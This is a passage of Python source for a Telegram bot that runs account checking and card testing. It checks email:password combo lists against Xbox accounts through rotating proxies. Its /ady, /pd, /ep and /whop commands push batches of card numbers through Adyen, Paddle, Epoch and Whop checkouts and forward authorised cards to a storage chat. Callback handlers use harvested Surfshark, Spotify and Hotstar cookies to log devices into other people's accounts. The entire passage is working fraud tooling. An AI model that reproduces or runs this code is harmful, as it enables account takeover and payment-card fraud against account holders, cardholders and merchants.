        "xbox_noxbox": noxbox, "xbox_bad": bad, "xbox_locked": locked,
        "xbox_error": error, "xbox_total": total, "processing": False,
    })
    await safe_edit(status_msg, xbox_fmt_summary(
        total, len(premium), len(hit), len(free), len(noxbox),
        len(bad), len(locked), len(error), elapsed),
        markup=main_markup("xbox"))

    if GC_STORE_CHAT_ID and (premium or hit):
        await _gc_store_xbox(bot, premium, hit, uid)


async def _run_xboxcap(uid, chat_id, total, combos, status_msg, bot: Bot):
    """Xbox Full Capture — lighter check, gamertag + gamerscore + gamepass + games."""
    hits, bad, tfa, error = [], [], [], []
    processed = last_edit = 0.0; start_t = time.time()
    proxy_mgr = PROXY_MANAGER

    for combo in combos:
        if ":" not in combo:
            bad.append({"status": "BAD", "reason": "malformed", "email": combo, "password": ""})
            processed += 1
            continue
        email, password = combo.split(":", 1)
        email, password = email.strip(), password.strip()
        if not email or not password:
            bad.append({"status": "BAD", "reason": "empty", "email": email, "password": password})
            processed += 1
            continue

        proxy = await proxy_mgr.get_verified_proxy_for("xboxcap") if proxy_mgr else None
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, xboxcap_check_one, email, password, proxy)

        status = result.get("status", "ERROR")
        if status == "HIT":
            hits.append(result)
            if proxy: proxy_mgr.mark_success(proxy)
            await bot.send_message(chat_id, xboxcap_fmt_hit(result), parse_mode="HTML")
        elif status == "BAD":
            bad.append(result)
        elif status == "2FA":
            tfa.append(result)
        else:
            error.append(result)
            if proxy: proxy_mgr.mark_failed(proxy)

        processed += 1
        if total > 1:
            now = time.monotonic()
            if now - last_edit >= 2.0:
                last_edit = now
                await safe_edit(status_msg, xboxcap_fmt_progress(
                    processed, total, len(hits), len(bad), len(tfa), len(error)))

    elapsed = time.time() - start_t
    user_results[uid].update({
        "xboxcap_hits": hits, "xboxcap_bad": bad, "xboxcap_2fa": tfa,
        "xboxcap_error": error, "xboxcap_total": total, "processing": False,
    })
    await safe_edit(status_msg, xboxcap_fmt_summary(
        total, len(hits), len(bad), len(tfa), len(error), elapsed),
        markup=main_markup("xboxcap"))

    if GC_STORE_CHAT_ID and hits:
        await _gc_store_xboxcap(bot, hits, uid)


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    ROUTER                                               ║
# ╚══════════════════════════════════════════════════════════════════════════╝

router = Router()


@router.message(Command("start"))
async def cmd_start(message: types.Message):
    uid = message.from_user.id
    user_results[uid] = _fresh_state()
    mode = user_results[uid]["mode"]
    await message.answer(start_text(mode), parse_mode="HTML", reply_markup=main_markup(mode))


@router.message(Command("stats"))
async def cmd_stats(message: types.Message):
    uid = message.from_user.id
    if uid not in ADMIN_IDS:
        await message.answer(f"{E_NO} Admin only.", parse_mode="HTML")
        return
    ps = PROXY_MANAGER.get_stats()
    await message.answer(
        f"{E_STATS} <b>Admin Disk Statistics</b>\n\n"
        f"<b>Proxies:</b> {ps['available']} available / {ps['total']} total ({ps['failed']} dead)\n\n"
        f"{SS_SHIELD} Surfshark: {len(glob.glob('ss_premium/*.txt'))} premium\n"
        f"{SP_MUSIC} Spotify: {len(glob.glob('sp_premium/*.txt'))} premium\n"
        f"{HS_TARGET} Hotstar: {len(glob.glob('hs_live/*.txt'))} live\n"
        f"{SP_PREMIUM} Netflix: {len(glob.glob('nf_premium/*.txt'))} premium\n"
        f"{HM_HIT} Hotmail: {len(glob.glob('hm_hit/*.txt'))} service files\n"
        f"{MSFC_HIT} MS FullCap: {len(glob.glob('msfc_hit/*.txt'))} hits\n"
        f"{CR_ICON} Crunchyroll: {len(glob.glob('cr_hit/*.txt'))} hits\n"
        f"{CR_ICON} Crunchyroll 2: {len(glob.glob('cr2_premium/*.txt'))} premium\n"
        f"{EX_ROCKET} ExpressVPN: {len(glob.glob('ex_premium/*.txt'))} premium\n"
        f"{PV_ICON} Prime Video: {len(glob.glob('pv_paid/*.txt'))} paid",
        parse_mode="HTML",
    )


@router.message(Command("addpxy"))
async def cmd_addpxy(message: types.Message):
    uid = message.from_user.id
    if uid not in ADMIN_IDS:
        await message.answer(f"{E_NO} Admin only.", parse_mode="HTML")
        return
    args = message.text.split(None, 1)
    if len(args) > 1:
        proxy = args[1].strip()
        status_msg = await message.answer(f"{E_CLOCK} <b>Validating proxy…</b>", parse_mode="HTML")
        ok, reason = await PROXY_MANAGER.add_proxy_async(proxy)
        if ok:
            meta = PROXY_MANAGER.proxies.get(proxy, {})
            await safe_edit(status_msg,
                            f"{E_CHECK} <b>Proxy added!</b>\n\n"
                            f"🔗 <code>{re.sub(r':[^@]+@', ':***@', proxy)}</code>\n"
                            f"⏱ Latency: <b>{meta.get('latency_ms','?')}ms</b>\n"
                            f"{E_COUNTRY} Country: <b>{meta.get('country','?')}</b>",
                            markup=main_markup(user_results[uid]["mode"]))
        else:
            await safe_edit(status_msg,
                            f"{SS_DEAD} <b>Proxy rejected</b>\n\nReason: <code>{reason}</code>",
                            markup=main_markup(user_results[uid]["mode"]))
        return
    if message.reply_to_message and message.reply_to_message.text:
        lines = [ln.strip() for ln in message.reply_to_message.text.split("\n") if ln.strip()]
        if not lines:
            await message.answer("❌ No proxies in replied message.")
            return
        status_msg = await message.answer(
            f"{E_CLOCK} <b>Validating {len(lines)} proxies…</b>\n(semaphore {PROXY_VALIDATE_CONCURRENCY})",
            parse_mode="HTML")
        result = await PROXY_MANAGER.add_proxies_bulk_async(lines)
        stats = PROXY_MANAGER.get_stats()
        await safe_edit(status_msg,
                        f"{E_CHECK} <b>Bulk import complete</b>\n\n"
                        f"✅ Added: {len(result['added'])}\n"
                        f"❌ Dead: {len(result['dead'])}\n"
                        f"🚫 Invalid: {len(result['invalid_format'])}\n"
                        f"🔁 Duplicate: {len(result['duplicate'])}\n\n"
                        f"Pool: {stats['available']} / {stats['total']}",
                        markup=main_markup(user_results[uid]["mode"]))
        return
    await message.answer(
        f"📝 <b>Add proxies (mandatory live validation)</b>\n\n"
        f"<b>Single:</b> <code>/addpxy socks5://user:pass@host:port</code>\n"
        f"<b>Bulk:</b> reply to a message with one proxy per line, then <code>/addpxy</code>",
        parse_mode="HTML")


@router.message(Command("listpxy"))
async def cmd_listpxy(message: types.Message):
    uid = message.from_user.id
    if uid not in ADMIN_IDS:
        await message.answer(f"{E_NO} Admin only.", parse_mode="HTML")
        return
    stats = PROXY_MANAGER.get_stats()
    if stats["total"] == 0:
        await message.answer("📭 No proxies. Add with <code>/addpxy</code>.", parse_mode="HTML")
        return
    items = PROXY_MANAGER.list_masked(limit=30)
    lines = [f"{E_STATS} <b>Proxy Pool</b>\n",
             f"Total: <b>{stats['total']}</b> · Available: <b>{stats['available']}</b> · Dead: <b>{stats['failed']}</b>\n",
             "━━━━━━━━━━━━━━━━━━"]
    for i, item in enumerate(items, 1):
        icon = "✅" if item["status"] == "alive" else "❌"
        lines.append(f"{i}. {icon} <code>{item['proxy']}</code>\n"
                     f"   ⏱ {item['latency_ms'] or '?'}ms · {E_COUNTRY} {item['country']} · "
                     f"✓{item['success']}/✗{item['fail']}")
    await message.answer("\n".join(lines), parse_mode="HTML")


@router.message(Command("checkpxy"))
async def cmd_checkpxy(message: types.Message):
    uid = message.from_user.id
    if uid not in ADMIN_IDS:
        await message.answer(f"{E_NO} Admin only.", parse_mode="HTML")
        return
    stats = PROXY_MANAGER.get_stats()
    if stats["total"] == 0:
        await message.answer("📭 No proxies to check.")
        return
    status_msg = await message.answer(
        f"{E_GEAR} <b>Re-checking {stats['total']} proxies…</b>", parse_mode="HTML")
    result = await PROXY_MANAGER.recheck_all_async()
    ns = PROXY_MANAGER.get_stats()
    await safe_edit(status_msg,
                    f"{E_CHECK} <b>Recheck complete</b>\n\n"
                    f"{E_COUNT} Checked: <b>{result['checked']}</b>\n"
                    f"{SS_PREMIUM} Alive: <b>{result['alive']}</b>\n"
                    f"{SS_DEAD} Dead: <b>{result['dead']}</b>\n\n"
                    f"Pool: <b>{ns['available']}</b> / <b>{ns['total']}</b>")


@router.message(Command("clearpyx"))
async def cmd_clearpyx(message: types.Message):
    uid = message.from_user.id
    if uid not in ADMIN_IDS:
        await message.answer(f"{E_NO} Admin only.", parse_mode="HTML")
        return
    PROXY_MANAGER.clear_proxies()
    await message.answer("🗑 All proxies cleared.")


@router.message(Command("diag"))
async def cmd_diag(message: types.Message):
    """Live diagnostic — shows which engines are actually workable."""
    uid = message.from_user.id
    if uid not in ADMIN_IDS:
        await message.answer(f"{E_NO} Admin only.", parse_mode="HTML")
        return
    text = f"{E_GEAR} <b>Environment Diagnostic</b>\n\n"
    text += f"{E_CHECK if _CURL_CFFI_OK else E_NO} <code>curl_cffi</code>: {'✅' if _CURL_CFFI_OK else '❌'}\n"
    text += f"{E_CHECK if _PYCRYPTODOME_OK else E_NO} <code>pycryptodome</code>: {'✅' if _PYCRYPTODOME_OK else '❌'}\n"
    text += f"{E_CHECK if _ASN1CRYPTO_OK else E_NO} <code>asn1crypto</code>: {'✅' if _ASN1CRYPTO_OK else '❌'}\n"
    text += f"{E_CHECK if _YAML_OK else E_NO} <code>pyyaml</code>: {'✅' if _YAML_OK else '❌'}\n"
    text += f"{E_CHECK if _PYZBAR_OK else E_NO} <code>pyzbar</code>: {'✅' if _PYZBAR_OK else '❌'}\n"
    ps = PROXY_MANAGER.get_stats()
    text += f"\n{E_STATS} <b>Proxies:</b> {ps['available']} / {ps['total']} available\n\n"
    text += f"<b>Service readiness:</b>\n"
    text += f"{E_CHECK} Surfshark, Spotify, Hotstar, HBO Max, Netflix, Hotmail\n"
    text += f"{E_CHECK if _CURL_CFFI_OK else E_NO} Netflix Cap, Whop\n"
    text += f"{E_CHECK if _PYCRYPTODOME_OK and _ASN1CRYPTO_OK else E_NO} ExpressVPN\n"
    text += f"{E_CHECK} Prime Video, Crunchyroll, Crunchyroll 2, MS FullCap"
    await message.answer(text, parse_mode="HTML")


# ── /ady command ──────────────────────────────────────────────────────────
@router.message(Command("ady"))
async def cmd_ady(message: types.Message, bot: Bot):
    """/ady <checkout_url> <card1> [card2] ... [card10]"""
    args = message.text.split(None, 1)
    if len(args) < 2:
        await message.answer(
            f"{WH_ICON} <b>Adyen Auto Checkout</b>\n\n"
            f"<b>Usage:</b>\n"
            f"<code>/ady &lt;checkout_url&gt; &lt;card1&gt; [card2] ... [card10]</code>\n\n"
            f"<b>Card format:</b>\n"
            f"<code>4111111111111111|12|2028|123</code>  or  "
            f"<code>4111111111111111/12/28/123</code>\n\n"
            f"<b>Example:</b>\n"
            f"<code>/ady https://adyen.link/ABC123 4111111111111111|12|28|123</code>\n\n"
            f"<i>Up to 10 cards. PBL, merchant checkout, or Adyen-direct URLs accepted.</i>\n"
            f"<i>Each result streams as an individual card.</i>",
            parse_mode="HTML")
        return

    parts = args[1].split()
    if len(parts) < 2:
        await message.answer("❌ Need URL + at least one card.\n"
                             "Format: <code>/ady URL CARD1 [CARD2]...</code>",
                             parse_mode="HTML")
        return

    checkout_url = parts[0]
    raw_cards = parts[1:11]  # max 10 cards

    if not (checkout_url.startswith(("http://", "https://"))
            or "adyen.link" in checkout_url
            or "." in checkout_url):
        await message.answer("❌ Invalid checkout URL.")
        return

    cards = []
    bad_cards = []
    for raw in raw_cards:
        c = adyen_parse_card(raw)
        if c:
            cards.append(c)
        else:
            bad_cards.append(raw)

    if not cards:
        await message.answer(f"❌ No valid cards. Rejected: <code>{', '.join(bad_cards)}</code>",
                             parse_mode="HTML")
        return

    status_msg = await message.answer(
        f"{WH_ICON} <b>Adyen Checkout Started</b>\n\n"
        f"🛒 URL: <code>{checkout_url[:70]}</code>\n"
        f"{WH_CARD} Cards: <b>{len(cards)}</b>"
        + (f" (rejected {len(bad_cards)})" if bad_cards else "") + "\n\n"
        f"⏳ Running concurrently…",
        parse_mode="HTML")

    results = []
    proxy_mgr = PROXY_MANAGER
    loop = asyncio.get_event_loop()
    uid = message.from_user.id

    async def run_one(idx_card):
        idx, card = idx_card
        proxy = None
        proxy_data = None
        if proxy_mgr:
            try:
                proxy = await proxy_mgr.get_verified_proxy_for("whop")
                if proxy:
                    proxy_data = {"http": proxy, "https": proxy, "raw": proxy}
            except Exception:
                proxy = None

        def _sync_hit():
            try:
                hitter = AdyenHitter(checkout_url, proxy_data=proxy_data)
                return hitter.hit(card)
            except Exception as e:
                return {
                    "success": False,
                    "decline_code": "exception",
                    "error": str(e)[:150],
                    "card": card,
                    "response_time": 0,
                    "merchant": "Adyen Merchant",
                    "amount": "N/A",
                    "is_live": False,
                }

        result = await loop.run_in_executor(None, _sync_hit)

        if proxy:
            if result.get("success"):
                proxy_mgr.mark_success(proxy)
            elif result.get("decline_code") == "rate_limited":
                proxy_mgr.mark_failed(proxy)
            elif result.get("decline_code") == "exception":
                proxy_mgr.mark_failed(proxy)

        return idx, result

    tasks = [run_one((i + 1, c)) for i, c in enumerate(cards)]
    for coro in asyncio.as_completed(tasks):
        idx, result = await coro
        results.append(result)
        try:
            await bot.send_message(
                message.chat.id,
                adyen_fmt_result(result, idx),
                parse_mode="HTML",
            )
        except Exception as e:
            logger.warning(f"ady send error: {e}")

    successes = sum(1 for r in results if r.get("success"))
    failed = sum(1 for r in results if not r.get("success") and r.get("decline_code") != "exception")
    errors = sum(1 for r in results if r.get("decline_code") == "exception")

    authorised = [r for r in results if r.get("success")]

    if GC_STORE_CHAT_ID and authorised:
        await _gc_store_ady(bot, authorised, message.from_user.id)

    await safe_edit(status_msg,
                    f"{WH_ICON} <b>Adyen Checkout Complete</b>\n\n"
                    f"🛒 URL: <code>{checkout_url[:70]}</code>\n"
                    f"{WH_CARD} Cards: <b>{len(results)}</b>\n\n"
                    f"{WH_OK} Authorised: <b>{successes}</b>\n"
                    f"{WH_FAIL} Declined: <b>{failed}</b>\n"
                    f"❌ Error: <b>{errors}</b>",
                    markup=main_markup(user_results[message.from_user.id]["mode"]))


# ── /pd command — Paddle ──────────────────────────────────────────────────
@router.message(Command("pd"))
async def cmd_paddle(message: types.Message, bot: Bot):
    """/pd <checkout_url> <card1> [card2] ... [card10]"""
    args = message.text.split(None, 1)
    if len(args) < 2:
        await message.answer(
            f"{WH_ICON} <b>Paddle Auto Checkout</b>\n\n"
            f"<code>/pd &lt;checkout_url&gt; &lt;card1&gt; [card2] ... [card10]</code>\n\n"
            f"<b>Card:</b> <code>4111111111111111|12|28|123</code>\n"
            f"<i>Supports pay.paddle.io / buy.paddle.com / paddle.com hosted checkouts.</i>",
            parse_mode="HTML")
        return

    parts = args[1].split()
    if len(parts) < 2:
        await message.answer("❌ Need URL + at least one card.", parse_mode="HTML")
        return

    checkout_url = parts[0]
    raw_cards = parts[1:11]
    if not (checkout_url.startswith(("http://", "https://")) or "paddle" in checkout_url or "." in checkout_url):
        await message.answer("❌ Invalid checkout URL.")
        return

    cards, bad_cards = [], []
    for raw in raw_cards:
        c = adyen_parse_card(raw)  # same card parser — 4-field
        if c:
            cards.append(c)
        else:
            bad_cards.append(raw)
    if not cards:
        await message.answer(f"❌ No valid cards. Rejected: <code>{', '.join(bad_cards)}</code>", parse_mode="HTML")
        return

    status_msg = await message.answer(
        f"{WH_ICON} <b>Paddle Checkout Started</b>\n\n"
        f"🛒 URL: <code>{checkout_url[:70]}</code>\n"
        f"{WH_CARD} Cards: <b>{len(cards)}</b>"
        + (f" (rejected {len(bad_cards)})" if bad_cards else "") + "\n\n⏳ Running…",
        parse_mode="HTML")

    results, loop, uid = [], asyncio.get_event_loop(), message.from_user.id
    proxy_mgr = PROXY_MANAGER

    async def run_one(idx_card):
        idx, card = idx_card
        proxy = await proxy_mgr.get_verified_proxy_for("paddle") if proxy_mgr else None
        proxy_data = {"raw": proxy, "server": proxy, "username": "", "password": ""} if proxy else None
        # strip the raw://... — PaddleHitter expects http://host:port
        if proxy_data:
            for scheme in ("socks5://", "socks4://"):
                if proxy_data["server"].startswith(scheme):
                    proxy_data["server"] = "http://" + proxy_data["server"][len(scheme):]
                    break
        try:
            hitter = PaddleHitter(checkout_url, proxy_data=proxy_data)
            result = await hitter.hit(card, idx, uid)
        except Exception as e:
            result = {"success": False, "decline_code": "exception",
                      "error": str(e)[:150], "card": card, "response_time": 0,
                      "merchant": "Paddle Merchant", "amount": None, "is_live": False}
        if proxy:
            (proxy_mgr.mark_success if result.get("success") else proxy_mgr.mark_failed)(proxy)
        return idx, result

    for coro in asyncio.as_completed([run_one((i + 1, c)) for i, c in enumerate(cards)]):
        idx, result = await coro
        results.append(result)
        try:
            await bot.send_message(message.chat.id, adyen_fmt_result(result, idx), parse_mode="HTML")
        except Exception as e:
            logger.warning(f"pd send error: {e}")

    ok = sum(1 for r in results if r.get("success"))
    no = sum(1 for r in results if not r.get("success") and r.get("decline_code") != "exception")
    ex = sum(1 for r in results if r.get("decline_code") == "exception")
    authorised = [r for r in results if r.get("success")]
    if GC_STORE_CHAT_ID and authorised:
        await _gc_store_ady(bot, authorised, uid)  # reuse Adyen GC store — same card format

    await safe_edit(status_msg,
        f"{WH_ICON} <b>Paddle Checkout Complete</b>\n\n"
        f"🛒 <code>{checkout_url[:70]}</code>\n\n"
        f"{WH_OK} Authorised: <b>{ok}</b>\n{WH_FAIL} Declined: <b>{no}</b>\n❌ Error: <b>{ex}</b>",
        markup=main_markup(user_results[uid]["mode"]))


# ── /ep command — Epoch ───────────────────────────────────────────────────
@router.message(Command("ep"))
async def cmd_epoch(message: types.Message, bot: Bot):
    """/ep <checkout_url> <card1> [card2] ... [card10]"""
    args = message.text.split(None, 1)
    if len(args) < 2:
        await message.answer(
            f"{WH_ICON} <b>Epoch Auto Checkout</b>\n\n"
            f"<code>/ep &lt;checkout_url&gt; &lt;card1&gt; [card2] ... [card10]</code>\n\n"
            f"<b>Card:</b> <code>4111111111111111|12|28|123</code>\n"
            f"<i>Supports epoch.com / epochbilling / wnu.com / billing.epoch.</i>",
            parse_mode="HTML")
        return

    parts = args[1].split()
    if len(parts) < 2:
        await message.answer("❌ Need URL + at least one card.", parse_mode="HTML")
        return

    checkout_url = parts[0]
    raw_cards = parts[1:11]
    if not (checkout_url.startswith(("http://", "https://")) or "epoch" in checkout_url or "wnu.com" in checkout_url or "." in checkout_url):
        await message.answer("❌ Invalid checkout URL.")
        return

    cards, bad_cards = [], []
    for raw in raw_cards:
        c = adyen_parse_card(raw)
        if c:
            cards.append(c)
        else:
            bad_cards.append(raw)
    if not cards:
        await message.answer(f"❌ No valid cards. Rejected: <code>{', '.join(bad_cards)}</code>", parse_mode="HTML")
        return

    status_msg = await message.answer(
        f"{WH_ICON} <b>Epoch Checkout Started</b>\n\n"
        f"🛒 URL: <code>{checkout_url[:70]}</code>\n"
        f"{WH_CARD} Cards: <b>{len(cards)}</b>"
        + (f" (rejected {len(bad_cards)})" if bad_cards else "") + "\n\n⏳ Running…",
        parse_mode="HTML")

    results, loop, uid = [], asyncio.get_event_loop(), message.from_user.id
    proxy_mgr = PROXY_MANAGER

    async def run_one(idx_card):
        idx, card = idx_card
        proxy = await proxy_mgr.get_verified_proxy_for("epoch") if proxy_mgr else None
        proxy_data = {"raw": proxy, "server": proxy, "username": "", "password": ""} if proxy else None
        if proxy_data:
            for scheme in ("socks5://", "socks4://"):
                if proxy_data["server"].startswith(scheme):
                    proxy_data["server"] = "http://" + proxy_data["server"][len(scheme):]
                    break
        try:
            hitter = EpochHitter(checkout_url, proxy_data=proxy_data)
            result = await hitter.hit(card, attempt=idx, user_id=uid)
        except Exception as e:
            result = {"success": False, "decline_code": "exception",
                      "error": str(e)[:150], "card": card, "response_time": 0,
                      "merchant": "Epoch Merchant", "amount": None, "is_live": False}
        if proxy:
            (proxy_mgr.mark_success if result.get("success") else proxy_mgr.mark_failed)(proxy)
        return idx, result

    for coro in asyncio.as_completed([run_one((i + 1, c)) for i, c in enumerate(cards)]):
        idx, result = await coro
        results.append(result)
        try:
            await bot.send_message(message.chat.id, adyen_fmt_result(result, idx), parse_mode="HTML")
        except Exception as e:
            logger.warning(f"ep send error: {e}")

    ok = sum(1 for r in results if r.get("success"))
    no = sum(1 for r in results if not r.get("success") and r.get("decline_code") != "exception")
    ex = sum(1 for r in results if r.get("decline_code") == "exception")
    authorised = [r for r in results if r.get("success")]
    if GC_STORE_CHAT_ID and authorised:
        await _gc_store_ady(bot, authorised, uid)

    await safe_edit(status_msg,
        f"{WH_ICON} <b>Epoch Checkout Complete</b>\n\n"
        f"🛒 <code>{checkout_url[:70]}</code>\n\n"
        f"{WH_OK} Authorised: <b>{ok}</b>\n{WH_FAIL} Declined: <b>{no}</b>\n❌ Error: <b>{ex}</b>",
        markup=main_markup(user_results[uid]["mode"]))


# ── /whop command ─────────────────────────────────────────────────────────
@router.message(Command("whop"))
async def cmd_whop(message: types.Message, bot: Bot):
    """/whop <checkout_url> <email> <card1> [card2] ... [card10]"""
    args = message.text.split(None, 1)
    if len(args) < 2:
        await message.answer(
            f"{WH_ICON} <b>Whop Auto Checkout</b>\n\n"
            f"<b>Usage:</b>\n"
            f"<code>/whop &lt;checkout_url&gt; &lt;email&gt; &lt;card1&gt; [card2] ... [card10]</code>\n\n"
            f"<b>Card format:</b>\n"
            f"<code>4111111111111111|12|2028|123</code>  or  "
            f"<code>4111111111111111/12/28/123</code>\n\n"
            f"<b>Example:</b>\n"
            f"<code>/whop https://whop.com/checkout/plan_abc buyer@mail.com 4111111111111111|12|28|123</code>\n\n"
            f"<i>Email is required. Up to 10 cards. Each result streams as an individual card.</i>",
            parse_mode="HTML")
        return

    parts = args[1].split()
    if len(parts) < 3:
        await message.answer(
            "❌ Need URL + email + at least one card.\n"
            "Format: <code>/whop URL EMAIL CARD1 [CARD2]...</code>",
            parse_mode="HTML")
        return

    checkout_url = parts[0]
    email = parts[1]
    raw_cards = parts[2:12]  # max 10 cards

    if "whop.com" not in checkout_url:
        await message.answer("❌ URL must be a whop.com checkout link.")
        return

    if "@" not in email:
        await message.answer(f"❌ Invalid email: <code>{email[:50]}</code>", parse_mode="HTML")
        return

    cards = []
    bad_cards = []
    for raw in raw_cards:
        c = whop_parse_card(raw)
        if c:
            cards.append(c)
        else:
            bad_cards.append(raw)

    if not cards:
        await message.answer(f"❌ No valid cards. Rejected: <code>{', '.join(bad_cards)}</code>",
                             parse_mode="HTML")
        return

    preflight_status = await message.answer(
        f"{WH_ICON} <b>Whop Checkout — Pre-flight</b>\n\n"
        f"🛒 URL: <code>{checkout_url[:70]}</code>\n"
        f"{E_EMAIL} Email: <code>{email}</code>\n"
        f"{WH_CARD} Cards: <b>{len(cards)}</b>"
        + (f" (rejected {len(bad_cards)})" if bad_cards else "") + "\n\n"
        f"⏳ Resolving plan…",
        parse_mode="HTML")

    loop = asyncio.get_event_loop()
    proxy_mgr = PROXY_MANAGER

    proxy0 = await proxy_mgr.get_verified_proxy_for("whop") if proxy_mgr else None
    try:
        if _CURL_CFFI_OK:
            preflight_session = creq.Session(impersonate="chrome")
        else:
            preflight_session = requests.Session()
        preflight_session.verify = False
        if proxy0:
            preflight_session.proxies = {"http": proxy0, "https": proxy0}
    except Exception:
        preflight_session = None

    plan_id_check, _ = (whop_parse_checkout_url(checkout_url, session_obj=preflight_session)
                        if preflight_session else (None, None))
    if preflight_session:
        try:
            preflight_session.close()
        except Exception:
            pass

    if not plan_id_check:
        await safe_edit(preflight_status,
                        f"{WH_FAIL} <b>Could not resolve plan_id</b>\n\n"
                        f"URL: <code>{checkout_url[:100]}</code>\n\n"
                        f"<i>Supported formats:</i>\n"
                        f"• <code>whop.com/checkout/plan_abc</code>\n"
                        f"• <code>whop.com/checkout/plan_abc/slug</code>\n"
                        f"• <code>whop.com/c/shortlink</code> (follows redirect)\n"
                        f"• <code>whop.com/product/xyz</code> (scrapes page)\n"
                        f"• <code>whop.com/checkout?session=abc</code>\n"
                        f"• <code>whop.com/app/checkout/xyz</code>",
                        markup=main_markup(user_results[message.from_user.id]["mode"]))
        return

    await safe_edit(preflight_status,
                    f"{WH_ICON} <b>Whop Checkout Started</b>\n\n"
                    f"🛒 Plan: <code>{plan_id_check}</code>\n"
                    f"{E_EMAIL} Email: <code>{email}</code>\n"
                    f"{WH_CARD} Cards: <b>{len(cards)}</b>\n\n"
                    f"⏳ Processing…",
                    markup=main_markup(user_results[message.from_user.id]["mode"]))

    results = []

    async def run_one(idx_card):
        idx, card = idx_card
        proxy = await proxy_mgr.get_verified_proxy_for("whop") if proxy_mgr else None
        result = await loop.run_in_executor(None, whop_check_card, checkout_url, email, card, proxy)
        if proxy:
            if result["status"] == "SUCCESS":
                proxy_mgr.mark_success(proxy)
            else:
                proxy_mgr.mark_failed(proxy)
        return idx, result

    tasks = [run_one((i + 1, c)) for i, c in enumerate(cards)]
    for coro in asyncio.as_completed(tasks):
        idx, result = await coro
        results.append(result)
        try:
            await bot.send_message(message.chat.id, whop_fmt_result(result, idx), parse_mode="HTML")
        except Exception as e:
            logger.warning(f"whop send error: {e}")

    successes = sum(1 for r in results if r["status"] == "SUCCESS")
    failed = sum(1 for r in results if r["status"] == "FAILED")
    errors = sum(1 for r in results if r["status"] == "ERROR")

    if GC_STORE_CHAT_ID:
        successful_orders = [r for r in results if r["status"] == "SUCCESS"]
        if successful_orders:
            await _gc_store_whop(bot, successful_orders, message.from_user.id)

    await safe_edit(preflight_status,
                    f"{WH_ICON} <b>Whop Checkout Complete</b>\n\n"
                    f"🛒 Plan: <code>{plan_id_check}</code>\n"
                    f"{E_EMAIL} Email: <code>{email}</code>\n\n"
                    f"{WH_OK} Success: <b>{successes}</b>\n"
                    f"{WH_FAIL} Failed: <b>{failed}</b>\n"
                    f"❌ Error: <b>{errors}</b>\n"
                    f"{WH_CARD} Total: <b>{len(results)}</b>",
                    markup=main_markup(user_results[message.from_user.id]["mode"]))


# ── Callback dispatcher ───────────────────────────────────────────────────
@router.callback_query()
async def button_callback(callback: types.CallbackQuery, bot: Bot):
    await callback.answer()
    uid = callback.from_user.id
    data = callback.data
    chat_id = callback.message.chat.id
    r = user_results[uid]
    mode = r["mode"]

    if data == "switch_service":
        await bot.send_message(chat_id, f"{E_WRENCH} <b>Select a service:</b>",
                               parse_mode="HTML", reply_markup=_service_markup())
        return
    if data.startswith("mode_"):
        new_mode = data[5:]
        user_results[uid]["mode"] = new_mode
        await bot.send_message(chat_id,
                               f"✅ Switched to <b>{SERVICES[new_mode]}</b>.\nSend a file to begin.",
                               parse_mode="HTML", reply_markup=main_markup(new_mode))
        return

    if data == "get_results":
        await _send_zip(chat_id, uid, bot)
    elif data == "view_stats":
        await _send_stats(chat_id, uid, bot)
    elif data == "clear_all":
        cur = user_results[uid]["mode"]
        user_results[uid] = _fresh_state()
        user_results[uid]["mode"] = cur
        await bot.send_message(chat_id, f"{E_TRASH} <b>Cleared.</b>",
                               parse_mode="HTML", reply_markup=main_markup(cur))
    elif data == "format_help":
        await bot.send_message(chat_id, FORMAT_TEXTS.get(mode, "No guide."),
                               parse_mode="HTML", reply_markup=main_markup(mode))

    # Surfshark login
    elif data == "ss_login_device":
        premium = r["ss_premium"]
        if not premium:
            await bot.send_message(chat_id, f"{SS_DEAD} No premium cookies.", parse_mode="HTML",
                                   reply_markup=main_markup("surfshark"))
            return
        best = max(premium, key=lambda x: x.get("days_left", 0))
        user_results[uid]["ss_awaiting_code"] = True
        user_results[uid]["ss_login_data"] = {
            "content": best.get("content", ""), "sstk": best.get("sstk", ""),
            "email": best.get("email", "Unknown"), "plan": best.get("plan", "Unknown"),
            "days_left": best.get("days_left", 0),
        }
        await bot.send_message(chat_id,
                               f"{SS_LOGIN} <b>Surfshark Device Login</b>\n\n"
                               f"Account: <code>{best.get('email','?')}</code>\n"
                               f"Plan: <code>{best.get('plan','?')}</code>\n\n"
                               f"Open Surfshark → Login on another device → Enter 6-digit code below",
                               parse_mode="HTML", reply_markup=_ss_cancel_markup())
    elif data == "ss_cancel_login":
        user_results[uid]["ss_awaiting_code"] = False
        user_results[uid]["ss_login_data"] = None
        await bot.send_message(chat_id, f"{E_TRASH} Cancelled.", parse_mode="HTML",
                               reply_markup=main_markup("surfshark"))

    # Spotify TV
    elif data == "sp_activate_tv":
        premium = r["sp_premium"]
        if not premium:
            await bot.send_message(chat_id, f"{SP_DEAD} No premium.", parse_mode="HTML",
                                   reply_markup=main_markup("spotify"))
            return
        best = premium[0]
        user_results[uid]["sp_awaiting_tv"] = True
        user_results[uid]["sp_tv_data"] = {
            "cookies": best.get("cookies", {}), "email": best.get("email", "Unknown"),
            "plan": best.get("plan", "Unknown"), "country": best.get("country", "Unknown"),
        }
        await bot.send_message(chat_id,
                               sp_fmt_tv_ready(best.get("email","?"), best.get("plan","?"), best.get("country","?")),
                               parse_mode="HTML", reply_markup=_sp_cancel_markup())
    elif data == "sp_cancel_tv":
        user_results[uid]["sp_awaiting_tv"] = False
        user_results[uid]["sp_tv_data"] = None
        await bot.send_message(chat_id, f"{E_TRASH} Cancelled.", parse_mode="HTML",
                               reply_markup=main_markup("spotify"))

    # Hotstar QR
    elif data == "hs_activate_qr":
        avail = hs_vault_available_count()
        if avail == 0:
            await bot.send_message(chat_id, f"{HS_INVALID} No vault cookies available.", parse_mode="HTML",
                                   reply_markup=main_markup("hotstar"))
            return
        user_results[uid]["hs_awaiting_qr"] = True
        await bot.send_message(chat_id,
                               f"{HS_TV} <b>JioHotstar QR Activator</b>\n\n"
                               f"Vault: <b>{avail}</b> available\n\n"
                               f"{E_CAMERA} Send a photo of your TV's QR code",
                               parse_mode="HTML", reply_markup=_hs_qr_cancel_markup())
    elif data == "hs_cancel_qr":
        user_results[uid]["hs_awaiting_qr"] = False
        await bot.send_message(chat_id, f"{E_TRASH} Cancelled.", parse_mode="HTML",
                               reply_markup=main_markup("hotstar"))
    elif data == "hs_vault_upload":
        if uid not in ADMIN_IDS and uid != OWNER_ID:
